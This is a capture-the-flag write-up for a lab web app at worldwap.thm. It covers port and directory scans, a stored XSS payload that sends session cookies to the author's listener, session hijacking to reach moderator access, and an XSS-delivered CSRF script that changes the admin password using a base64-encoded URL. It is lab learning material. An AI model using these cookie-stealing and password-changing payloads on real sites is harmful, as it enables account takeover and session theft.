# Nmap Scans
```
  ❯ nmap -p- worldwap.thm
  Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 11:18 CET
  Nmap scan report for worldwap.thm (10.81.191.54)
  Host is up (0.049s latency).
  Not shown: 65532 closed tcp ports (reset)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  8081/tcp open  blackice-icecap
```
-p 80 gives redirect for /public/html. ../ additionaly contains cs, images and js. 
We are open to check .js scripts for login, register and logout - it will be useful, especially to determine what we can do. 
Seems in further tasks we could do some stored blind XSS.

# Dir scans
```
❯ gobuster dir -u http://worldwap.thm/public/html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt,js,zip,bak,old -t 40
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm/public/html
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              js,zip,bak,old,php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1797]
/login.php            (Status: 200) [Size: 1785]
/register.php         (Status: 200) [Size: 2188]
/admin.php            (Status: 403) [Size: 0]
/upload.php           (Status: 403) [Size: 0]
/logout.php           (Status: 200) [Size: 154]
/mod.php              (Status: 403) [Size: 0]
/dashboard.php        (Status: 403) [Size: 0]
```
# worldwap.thm/public/html/register.php
### You can now pre-register! Your details will be reviewed by the site moderator.
Three input fields, review by moderator, register.js, no sanitisation nor validation ~> its time for XSS!
Lets make a request in 
### BUrp$UiTe 
To confirm that it doesnt sanitise stuff --- And it does not!
```
{"username":"adaam","password":"","email":"adaam@wp.pl","name":"<img src=x onerror=this.src='http://192.168.134.253:8000/?c='+document.cookie>"}
```
If now You're thinking - the hell im supposed to know payloads - nope. Probably You're as dumb as me and:
- I have never ever made my journey easier and saved working code for anything, so everytime im lookin for em or or in Hack-Tools (nice firefox extension!) or via web.
- Don't be as stupid as me, save it, name it nicely, use it in future, append more to it.
```
10.81.191.54 - - [25/Dec/2025 11:57:58] "GET /?c=PHPSESSID=ejgv42uaoil6gnc092k1dd8mt0 HTTP/1.1" 200 -
```
<img width="225" height="225" alt="image" src="https://github.com/user-attachments/assets/afada933-2497-44bc-a786-0019da5e4d6f" />

Lets BurpyBurpIt. No place for our token via /login, sooo my mastermind is tellin me to check how request looks like for /dashboard.php. And Yepp, there's place for it.
Using stolen PHPSESSID via /dashboard.php leads to Moderator role on Dashboard!
Ive moved around using dir scan we have made before - /mod, admin, upload etc but it seems like a honeyhole, because couldnt even get the first flag which is suppossed to be shown after 
loggin in as Moderator. Then saw that there's an though made by Moderator on the dashboard: leading to http://www.login.worldwap.thm to which I've made next dir scan
# http://www.login.worldwap.thm dir scan
```❯ gobuster dir -u http://login.worldwap.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x py,php,html,txt,js,zip,bak,old -t 40
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://login.worldwap.thm
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              py,php,html,txt,js,zip,bak,old
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 70]
/login.php            (Status: 200) [Size: 3108]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/clear.php            (Status: 200) [Size: 4]
/admin.py             (Status: 200) [Size: 5537]
/assets               (Status: 301) [Size: 325] [--> http://login.worldwap.thm/assets/]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/test.py              (Status: 200) [Size: 687]
/db.php               (Status: 200) [Size: 0]
/javascript           (Status: 301) [Size: 329] [--> http://login.worldwap.thm/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/setup.php            (Status: 200) [Size: 149]
/block.php            (Status: 200) [Size: 15]
/logs.txt             (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 329] [--> http://login.worldwap.thm/phpmyadmin/]
```
Using sessionid, ive logged in as moderator via /login.php and obtained first flag. Then, by checking /admin.py - got username and password for admin, which suprisingly works and got second flag. 
But it seems a little bit to easy, so ill try to obtain it using stuff I've learned via last rooms in WEbPEntesting path.
# http://login.worldwap.thm
### /chat.php
Chat with admin seems liek something interesting, doesnt it? For educational purposes only Ohmeingod 
<img width="647" height="413" alt="image" src="https://github.com/user-attachments/assets/bd7e0ba4-cfaa-41b4-a0fb-868e419f766c" />
Once again, we found a XSS vulnerability. Our sharp eye notices then  
### /change_password.php
And our universal brain mixes it with learnings we've got from CSRF room, including:
```
<script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://mybank.thm/updatepassword', true);
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                alert("Action executed!");
            }
        };
        xhr.send('action=execute&parameter=value');
    </script>
```
Using developer tools, we can extract parameter name for chaning the password which is: ```<input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required="">```
LEts try to send it via Burp. WOw, some sanitisation over here for link. We have to encode it to b64. 
2 easy ways: https://gchq.github.io/CyberChef/ or ```base64 <<< 'Hello, World!'``` via bash.
So by modyfing 2 lines to:
```
xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
xhr.send('action=execute&new_password=yourpass');
```
We are ready to change admin password, just send it, and voile, You can obtain second flag for second time!

